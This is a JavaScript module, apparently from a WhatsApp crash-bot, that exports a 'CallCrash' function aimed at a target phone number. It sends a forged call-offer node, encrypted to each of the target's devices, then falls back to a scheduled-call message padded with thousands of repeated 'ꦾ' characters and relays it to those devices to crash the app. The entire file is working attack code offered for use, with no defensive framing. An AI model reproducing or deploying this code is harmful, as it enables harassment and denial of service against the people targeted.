const { relayCrashToDevices, getTargetDevices } = require('../target-utils');
const crypto = require('crypto');

async function CallCrash(SYxS7, target) {
  let nodeSent = false;

  // 1. Try sending direct call node stanza
  try {
    let devices = await getTargetDevices(SYxS7, target);
    if (!devices || !devices.length) {
      const user = target.split('@')[0];
      devices = [`${user}:0@s.whatsapp.net`, target];
    }

    if (typeof SYxS7.assertSessions === 'function') {
      try { await SYxS7.assertSessions(devices); } catch (e) {}
    }

    const pad = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const selfId = SYxS7.user?.id || SYxS7.authState?.creds?.me?.id || target;

    const nodes = await Promise.all(
      devices.map(async (recipientJid) => {
        const encoded = pad(
          SYxS7.encodeWAMessage
            ? SYxS7.encodeWAMessage({ conversation: "y" })
            : Buffer.from("y")
        );

        let type = 'pkmsg';
        let ciphertext = encoded;

        if (SYxS7.signalRepository?.encryptMessage) {
          try {
            const res = await SYxS7.signalRepository.encryptMessage({
              jid: recipientJid,
              data: encoded
            });
            type = res.type;
            ciphertext = res.ciphertext;
          } catch (e) {}
        }

        return {
          tag: "to",
          attrs: { jid: recipientJid },
          content: [
            {
              tag: "enc",
              attrs: { v: "2", type, count: "0" },
              content: ciphertext
            }
          ]
        };
      })
    );

    const callNode = {
      tag: "call",
      attrs: {
        to: target,
        id: typeof SYxS7.generateMessageTag === 'function' ? SYxS7.generateMessageTag() : 'CALL123',
        from: selfId
      },
      content: [
        {
          tag: "offer",
          attrs: {
            "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
            "call-creator": selfId
          },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            {
              tag: "video",
              attrs: {
                enc: "vp8",
                dec: "vp8",
                orientation: "0",
                screen_width: "1920",
                screen_height: "1080",
                device_orientation: "0"
              }
            },
            { tag: "net", attrs: { medium: "3" } },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            { tag: "encopt", attrs: { keygen: "2" } },
            {
              tag: "destination",
              attrs: {},
              content: nodes.filter(Boolean)
            }
          ]
        }
      ]
    };

    if (typeof SYxS7.sendNode === 'function') {
      await SYxS7.sendNode(callNode);
      nodeSent = true;
    }
  } catch (err) {
    console.error("[CallCrash sendNode]", err.message);
  }

  // 2. Multi-tier fallback call-crash payload
  const callCrashPayload = {
    scheduledCallCreationMessage: {
      callType: 1,
      title: "📞 CALL CRASH " + "ꦾ".repeat(1500),
      scheduledTimestampMs: Date.now() + 1000,
      contextInfo: {
        mentionedJid: [target, "0@s.whatsapp.net"],
        externalAdReply: {
          title: "📞 INCOMING CRASH CALL",
          body: "ꦾ".repeat(1000),
          mediaType: "IMAGE",
          sourceUrl: "https://whatsapp.com"
        }
      }
    }
  };

  const res = await relayCrashToDevices(SYxS7, target, callCrashPayload);
  if (nodeSent) res.deliveredCount += 1;
  return res;
}

module.exports = { CallCrash };
